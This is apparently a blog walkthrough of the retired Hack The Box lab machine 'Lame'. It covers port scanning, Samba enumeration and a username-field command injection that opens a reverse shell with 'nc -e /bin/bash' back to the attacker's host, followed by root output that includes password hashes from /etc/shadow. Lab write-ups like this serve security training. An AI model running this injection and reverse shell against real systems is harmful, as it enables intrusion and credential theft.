---
layout: single
title: Lame - Hack The Box
excerpt: "Lame is a beginner level machine, requiring only one exploit to obtain root access. It was the first
machine published on Hack The Box and was often the first machine for new users prior to its
retirement."
date: 2022-05-19
classes: wide
header:
  teaser: /assets/images/htb-writeup-lame/lame_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:  
  - osticket
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-lame/lame_logo.png)

---

SYNOPSIS

Lame is a beginner level machine, requiring only one exploit to obtain root access. It was the first
machine published on Hack The Box and was often the first machine for new users prior to its
retirement.

__Skills Required__
- Basic knowledge of Linux
- Enumerating ports and services

__Skills Learned__
- Identifying vulnerable services
- Exploiting Samba

# Reconnaissance
First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports.

**masscan**
```bash
masscan -p1-65535,U:1-65535 --rate=500 -e tun0 10.129.211.206
```

```bash
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-05-18 21:28:20 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 22/tcp on 10.129.211.206                                  
Discovered open port 139/tcp on 10.129.211.206                                 
Discovered open port 21/tcp on 10.129.211.206                                  
Discovered open port 3632/tcp on 10.129.211.206                                
Discovered open port 445/tcp on 10.129.211.206
```
__Nmap__

```bash
# Nmap 7.92 scan initiated Sun May 15 21:44:39 2022 as: nmap -p- -sS --min-rate 5000 --open -T5 -vvv -n -Pn -oG allPorts 10.129.211.206
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.129.117.20 ()	Status: Up
Host: 10.129.117.20 ()	Ports: 21/open/tcp//ftp///, 22/open/tcp//ssh///, 139/open/tcp//netbios-ssn///, 445/open/tcp//microsoft-ds///, 3632/open/tcp//distccd///	Ignored State: filtered (65530)
# Nmap done at Sun May 15 21:45:05 2022 -- 1 IP address (1 host up) scanned in 26.69 seconds
```

- IP Address: 10.129.211.206
- Open ports: 21,22,139,445,3632

```bash
nmap -sCV -p21,22,139,445,3632 -oN targeted 10.129.211.206
```

```bash
# Nmap 7.92 scan initiated Sun May 15 21:46:55 2022 as: nmap -sCV -p21,22,139,445,3632 -oN targeted 10.129.211.206
Nmap scan report for 10.129.117.20
Host is up (0.19s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.68
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2022-05-15T14:46:10-04:00
|_clock-skew: mean: 1h59m00s, deviation: 2h49m43s, median: -1m00s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun May 15 21:47:49 2022 -- 1 IP address (1 host up) scanned in 54.25 seconds
```

We get back the following result showing that these ports are open:

   - Port 21: running File Transfer Protocol (FTP) version 2.3.4. This allows anonymous login so we should keep that in mind.
   - Port 22: running OpenSSH version 4.7p1.
   - Ports 139 and 445: are running Samba v3.0.20-Debian.
   - Port 3632: running the distributed compiler daemon distcc version 1.

# Enumeration

Let’s enumerate more to determine if any of these services are either misconfigured or running vulnerable versions.

I have high hopes to gain at least an initial foothold using these ports.
Let’s use smbclient to access the SMB server. [here](https://raw.githubusercontent.com/offensive-security/exploitdb/master/exploits/unix/remote/16320.rb)

```bash
searchsploit samba 3.0.20
```

```bash
smbclient -L 10.129.211.206 -N --option="client min protocol=NT1"
```

```bash
Can't load /etc/samba/smb.conf - run testparm to debug it
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	tmp             Disk      oh noes!
	opt             Disk      
	IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
	ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            LAME
```

Now Listen on interface tun0

```
tcpdump -i tun0 icmp -n
```

logon it is used to login into smb

```bash
smbclient //10.129.211.206/tmp -N --option="client min protocol=NT1"
```
```bash
Can't load /etc/samba/smb.conf - run testparm to debug it
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> logon "/=`nohup ping -c 1 10.10.14.75`"
Password: 
session setup failed: NT_STATUS_LOGON_FAILURE
smb: \> 
```

```bash
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
01:29:17.989844 IP 10.129.211.206 > 10.10.14.75: ICMP echo request, id 1816, seq 1, length 64
01:29:17.989870 IP 10.10.14.75 > 10.129.211.206: ICMP echo reply, id 1816, seq 1, length 64
```

# Exploitation

Add a listener on attack machine.

```bash
nc -nlvp 443
```

Log into the smb client.
nohup run a command immune to hangups, with output to a non-tty

```bash
smbclient //10.129.211.206/tmp -N --option="client min protocol=NT1" -c 'logon "/=`nohup nc -e /bin/bash 10.10.14.75 443`"'
```

The shell connects back to our attack machine and we have root! In this scenario, we didn’t need to escalate privileges.

```bash
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.129.211.206.
Ncat: Connection from 10.129.211.206:59898.
id && /sbin/ifconfig && uname -a && cat /etc/shadow && ls -lah /root
uid=0(root) gid=0(root)
eth0      Link encap:Ethernet  HWaddr 00:50:56:b9:f3:d7  
          inet addr:10.129.211.206  Bcast:10.129.255.255  Mask:255.255.0.0
          inet6 addr: dead:beef::250:56ff:feb9:f3d7/64 Scope:Global
          inet6 addr: fe80::250:56ff:feb9:f3d7/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:144587 errors:0 dropped:0 overruns:0 frame:0
          TX packets:315 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:8813626 (8.4 MB)  TX bytes:45512 (44.4 KB)
          Interrupt:19 Base address:0x2024 

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:811 errors:0 dropped:0 overruns:0 frame:0
          TX packets:811 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:375285 (366.4 KB)  TX bytes:375285 (366.4 KB)

Linux lame 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
root:$1$p/d3CvVJ$4HDjev4SJFo7VMwL2Zg6P0:17239:0:99999:7:::
daemon:*:14684:0:99999:7:::
bin:*:14684:0:99999:7:::
sys:$1$NsRwcGHl$euHtoVjd59CxMcIasiTw/.:17239:0:99999:7:::
sync:*:14684:0:99999:7:::
games:*:14684:0:99999:7:::
man:*:14684:0:99999:7:::
lp:*:14684:0:99999:7:::
mail:*:14684:0:99999:7:::
news:*:14684:0:99999:7:::
uucp:*:14684:0:99999:7:::
proxy:*:14684:0:99999:7:::
www-data:*:14684:0:99999:7:::
backup:*:14684:0:99999:7:::
list:*:14684:0:99999:7:::
irc:*:14684:0:99999:7:::
gnats:*:14684:0:99999:7:::
nobody:*:14684:0:99999:7:::
libuuid:!:14684:0:99999:7:::
dhcp:*:14684:0:99999:7:::
syslog:*:14684:0:99999:7:::
klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:14742:0:99999:7:::
sshd:*:14684:0:99999:7:::
bind:*:14685:0:99999:7:::
postfix:*:14685:0:99999:7:::
ftp:*:14685:0:99999:7:::
postgres:$1$dwLrUikz$LRJRShCPfPyYb3r6pinyM.:17239:0:99999:7:::
mysql:!:14685:0:99999:7:::
tomcat55:*:14691:0:99999:7:::
distccd:*:14698:0:99999:7:::
service:$1$cwdqim5m$bw71JTFHNWLjDTmYTNN9j/:17239:0:99999:7:::
telnetd:*:14715:0:99999:7:::
proftpd:!:14727:0:99999:7:::
statd:*:15474:0:99999:7:::
snmp:*:15480:0:99999:7:::
makis:$1$Yp7BAV10$7yHWur1KMMwK5b8KRZ2yK.:17239:0:99999:7:::
total 80K
drwxr-xr-x 13 root root 4.0K May 18 17:12 .
drwxr-xr-x 21 root root 4.0K Oct 31  2020 ..
-rw-------  1 root root  373 May 18 17:12 .Xauthority
lrwxrwxrwx  1 root root    9 May 14  2012 .bash_history -> /dev/null
-rw-r--r--  1 root root 2.2K Oct 20  2007 .bashrc
drwx------  3 root root 4.0K May 20  2012 .config
drwx------  2 root root 4.0K May 20  2012 .filezilla
drwxr-xr-x  5 root root 4.0K May 18 17:12 .fluxbox
drwx------  2 root root 4.0K May 20  2012 .gconf
drwx------  2 root root 4.0K May 20  2012 .gconfd
drwxr-xr-x  2 root root 4.0K May 20  2012 .gstreamer-0.10
drwx------  4 root root 4.0K May 20  2012 .mozilla
-rw-r--r--  1 root root  141 Oct 20  2007 .profile
drwx------  5 root root 4.0K May 20  2012 .purple
-rwx------  1 root root    4 May 20  2012 .rhosts
drwxr-xr-x  2 root root 4.0K May 20  2012 .ssh
drwx------  2 root root 4.0K May 18 17:12 .vnc
drwxr-xr-x  2 root root 4.0K May 20  2012 Desktop
-rwx------  1 root root  401 May 20  2012 reset_logs.sh
-rw-------  1 root root   33 May 18 17:12 root.txt
-rw-r--r--  1 root root  118 May 18 17:12 vnc.log
```
